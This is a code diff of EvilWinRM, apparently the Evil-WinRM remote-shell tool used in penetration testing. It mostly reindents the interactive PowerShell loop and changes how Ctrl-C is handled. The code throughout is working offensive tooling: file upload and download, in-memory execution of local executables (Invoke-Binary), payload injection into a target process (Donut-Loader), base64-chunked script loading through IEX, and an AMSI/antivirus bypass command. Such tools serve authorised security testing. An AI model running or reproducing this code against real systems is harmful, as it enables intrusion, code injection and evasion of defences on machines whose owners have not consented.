@@ -392,171 +392,166 @@ class EvilWinRM
             time = Time.now.to_i
             self.print_message("Establishing connection to remote endpoint", TYPE_INFO)
             $conn.shell(:powershell) do |shell|
-        begin
-                until command == "exit" do
-
-                    pwd = shell.run("(get-location).path").output.strip
-                    if $colors_enabled then
-                        command = Readline.readline(self.colorize("*Evil-WinRM*", "red") + self.colorize(" PS ", "yellow") + pwd + "> ", true)
-                    else
-                        command = Readline.readline("*Evil-WinRM* PS " + pwd + "> ", true)
-                    end
-
-                    if command.start_with?('upload') then
-                        if self.docker_detection() then
-                            puts()
-                            self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING)
+                begin
+                    until command == "exit" do
+                        pwd = shell.run("(get-location).path").output.strip
+                        if $colors_enabled then
+                            command = Readline.readline(self.colorize("*Evil-WinRM*", "red") + self.colorize(" PS ", "yellow") + pwd + "> ", true)
+                        else
+                            command = Readline.readline("*Evil-WinRM* PS " + pwd + "> ", true)
                         end
 
-                        upload_command = command.tokenize
-                        command = ""
-
-                        if upload_command[2].to_s.empty? then 
-                            upload_command[2] = "#{pwd}\\#{upload_command[1].split('/')[-1]}"
-                        elsif not upload_command[2].index ':\\'
-                            upload_command[2] = "#{pwd}\\#{upload_command[2]}"
-                        end
-                        begin
-                            self.print_message("Uploading #{upload_command[1]} to #{upload_command[2]}", TYPE_INFO)
-                            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes|
-                            if bytes_copied == total_bytes then
-                                self.print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA)
-                                self.print_message("Upload successful!", TYPE_INFO)
+                        if command.start_with?('upload') then
+                            if self.docker_detection() then
+                                puts()
+                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING)
                             end
-                          end
-                        rescue
-                            self.print_message("Upload failed. Check filenames or paths", TYPE_ERROR)
-                        end
 
-                    elsif command.start_with?('download') then
-                        if self.docker_detection() then
-                            puts()
-                            self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING)
-                        end
-
-                        download_command = command.tokenize
-                        command = ""
-
-                        if not download_command[1].index ':\\' then download_command[1] = "#{pwd}\\#{download_command[1]}" end
-                        
-                        if download_command[2].to_s.empty? then download_command[2] = download_command[1].split('\\')[-1] end
-                        
-                        begin
-                            self.print_message("Downloading #{download_command[1]} to #{download_command[2]}", TYPE_INFO)
-                            file_manager.download(download_command[1], download_command[2])
-                            self.print_message("Download successful!", TYPE_INFO)
-                        rescue
-                            self.print_message("Download failed. Check filenames or paths", TYPE_ERROR)
-                        end
-
-                    elsif command.start_with?('Invoke-Binary') then
-                        begin
-                            invoke_Binary = command.tokenize
+                            upload_command = command.tokenize
                             command = ""
-                            if !invoke_Binary[1].to_s.empty? then
-                                load_executable = invoke_Binary[1]
-                                load_executable = File.binread(load_executable)
-                                load_executable = Base64.strict_encode64(load_executable)
-                                if !invoke_Binary[4].to_s.empty? && invoke_Binary[5].to_s.empty?
-                                    output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3] + "," + invoke_Binary[4])
-                                elsif !invoke_Binary[3].to_s.empty? && invoke_Binary[4].to_s.empty?
-                                    output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3])
-                                elsif !invoke_Binary[2].to_s.empty? && invoke_Binary[3].to_s.empty?
-                                    output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2])
-                                elsif invoke_Binary[2].to_s.empty?
-                                    output = shell.run("Invoke-Binary " + load_executable)
+
+                            if upload_command[2].to_s.empty? then
+                                upload_command[2] = "#{pwd}\\#{upload_command[1].split('/')[-1]}"
+                            elsif not upload_command[2].index ':\\'
+                                upload_command[2] = "#{pwd}\\#{upload_command[2]}"
+                            end
+                            begin
+                                self.print_message("Uploading #{upload_command[1]} to #{upload_command[2]}", TYPE_INFO)
+                                file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes|
+                                    if bytes_copied == total_bytes then
+                                        self.print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA)
+                                        self.print_message("Upload successful!", TYPE_INFO)
+                                    end
                                 end
-                            elsif
-                                output = shell.run("Invoke-Binary")
+                            rescue
+                                self.print_message("Upload failed. Check filenames or paths", TYPE_ERROR)
                             end
-                            print(output.output)
-                        rescue
-                            self.print_message("Check filenames", TYPE_ERROR)
-                        end
+                        elsif command.start_with?('download') then
+                            if self.docker_detection() then
+                                puts()
+                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING)
+                            end
 
-                    elsif command.start_with?('Donut-Loader') then
-                        begin
-                            donut_Loader = command.tokenize
+                            download_command = command.tokenize
                             command = ""
-                            if !donut_Loader[4].to_s.empty? then
-                                pid = donut_Loader[2]
-                                load_executable = donut_Loader[4]
-                                load_executable = File.binread(load_executable)
-                                load_executable = Base64.strict_encode64(load_executable)
-                                output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
-                            elsif
-                                output = shell.run("Donut-Loader")
+
+                            if not download_command[1].index ':\\' then download_command[1] = "#{pwd}\\#{download_command[1]}" end
+
+                            if download_command[2].to_s.empty? then download_command[2] = download_command[1].split('\\')[-1] end
+
+                            begin
+                                self.print_message("Downloading #{download_command[1]} to #{download_command[2]}", TYPE_INFO)
+                                file_manager.download(download_command[1], download_command[2])
+                                self.print_message("Download successful!", TYPE_INFO)
+                            rescue
+                                self.print_message("Download failed. Check filenames or paths", TYPE_ERROR)
                             end
-                            print(output.output)
-                        rescue
-                            self.print_message("Check filenames", TYPE_ERROR)
-                        end
 
-                    elsif command.start_with?('services') then
-                        command = ""
-                        output = shell.run('Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath | fl')
-                        print(output.output.chomp)
+                        elsif command.start_with?('Invoke-Binary') then
+                            begin
+                                invoke_Binary = command.tokenize
+                                command = ""
+                                if !invoke_Binary[1].to_s.empty? then
+                                    load_executable = invoke_Binary[1]
+                                    load_executable = File.binread(load_executable)
+                                    load_executable = Base64.strict_encode64(load_executable)
+                                    if !invoke_Binary[4].to_s.empty? && invoke_Binary[5].to_s.empty?
+                                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3] + "," + invoke_Binary[4])
+                                    elsif !invoke_Binary[3].to_s.empty? && invoke_Binary[4].to_s.empty?
+                                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3])
+                                    elsif !invoke_Binary[2].to_s.empty? && invoke_Binary[3].to_s.empty?
+                                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2])
+                                    elsif invoke_Binary[2].to_s.empty?
+                                        output = shell.run("Invoke-Binary " + load_executable)
+                                    end
+                                elsif
+                                    output = shell.run("Invoke-Binary")
+                                end
+                                print(output.output)
+                            rescue
+                                self.print_message("Check filenames", TYPE_ERROR)
+                            end
 
-                    elsif command.start_with?(*functions) then
-                        self.silent_warnings do
-                            load_script = $scripts_path + command
+                        elsif command.start_with?('Donut-Loader') then
+                            begin
+                                donut_Loader = command.tokenize
+                                command = ""
+                                if !donut_Loader[4].to_s.empty? then
+                                    pid = donut_Loader[2]
+                                    load_executable = donut_Loader[4]
+                                    load_executable = File.binread(load_executable)
+                                    load_executable = Base64.strict_encode64(load_executable)
+                                    output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
+                                elsif
+                                    output = shell.run("Donut-Loader")
+                                end
+                                print(output.output)
+                            rescue
+                                self.print_message("Check filenames", TYPE_ERROR)
+                            end
+
+                        elsif command.start_with?('services') then
                             command = ""
-                            load_script = load_script.gsub(" ","")
-                            load_script = File.binread(load_script)
-                            load_script = Base64.strict_encode64(load_script)
-                            script_split = load_script.scan(/.{1,5000}/)
-                            script_split.each do |item|
-                                output = shell.run("$a += '#{item}'")
+                            output = shell.run('Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath | fl')
+                            print(output.output.chomp)
+
+                        elsif command.start_with?(*functions) then
+                            self.silent_warnings do
+                                load_script = $scripts_path + command
+                                command = ""
+                                load_script = load_script.gsub(" ","")
+                                load_script = File.binread(load_script)
+                                load_script = Base64.strict_encode64(load_script)
+                                script_split = load_script.scan(/.{1,5000}/)
+                                script_split.each do |item|
+                                    output = shell.run("$a += '#{item}'")
+                                end
+                                output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
+                                output = shell.run("$a = $null")
                             end
-                            output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
-                            output = shell.run("$a = $null")
+
+                        elsif command.start_with?('menu') then
+                            command = ""
+                            self.silent_warnings do
+                                output = shell.run(menu)
+                                output = shell.run("Menu")
+                                autocomplete = shell.run("auto").output.chomp
+                                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
+                                assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
+                                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
+                                if !assemblyautocomplete.to_s.empty?
+                                    $LISTASSEMNOW = assemblyautocomplete.split("\n")
+                                    $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
+                                end
+                                $LIST2 = autocomplete.split("\n")
+                                $LIST = $LIST + $LIST2
+                                print(output.output)
+                            end
+
+                        elsif (command == "Bypass-4MSI") and (Time.now.to_i < time + 20)
+                            puts()
+                            self.print_message("AV could be still watching for suspicious activity. Waiting for patching...", TYPE_WARNING)
+                            sleep(9)
                         end
 
-                    elsif command.start_with?('menu') then
-                        command = ""
-                        self.silent_warnings do
-                            output = shell.run(menu)
-                            output = shell.run("Menu")
-                            autocomplete = shell.run("auto").output.chomp
-                            autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
-                            assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
-                            assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
-                            if !assemblyautocomplete.to_s.empty?
-                                $LISTASSEMNOW = assemblyautocomplete.split("\n")
-                                $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
+                        output = shell.run(command) do |stdout, stderr|
+                            stdout&.each_line do |line|
+                                STDOUT.puts(line.rstrip!)
                             end
-                            $LIST2 = autocomplete.split("\n")
-                            $LIST = $LIST + $LIST2
-                            print(output.output)
+                            STDERR.print(stderr)
                         end
-
-                    elsif (command == "Bypass-4MSI") and (Time.now.to_i < time + 20)
-                        puts()
-                        self.print_message("AV could be still watching for suspicious activity. Waiting for patching...", TYPE_WARNING)
-                        sleep(9)
                     end
-
-                    output = shell.run(command) do |stdout, stderr|
-                        stdout&.each_line do |line|
-                            STDOUT.puts(line.rstrip!)
-                        end
-                        STDERR.print(stderr)
+                rescue Interrupt
+                    puts("\n\n")
+                    self.print_message("Press \"y\" to exit, press any other key to continue", TYPE_WARNING)
+                    if STDIN.getch.downcase == "y" or STDIN.getch.downcase == "Y"
+                        self.custom_exit(130)
+                    else
+                        retry
                     end
                 end
-        rescue Interrupt
-            puts
-            self.print_message("Press y to exit, press any other key to continue: ", TYPE_WARNING)
-            if STDIN.getch.downcase == "y"
-                puts
-                self.custom_exit(130)
-            end
-            puts
-            retry
+            self.custom_exit(0)
         end
-                self.custom_exit(0)
-            end
-        #rescue SignalException
-        #    self.custom_exit(130)
         rescue SystemExit
         rescue SocketError
             self.print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR)
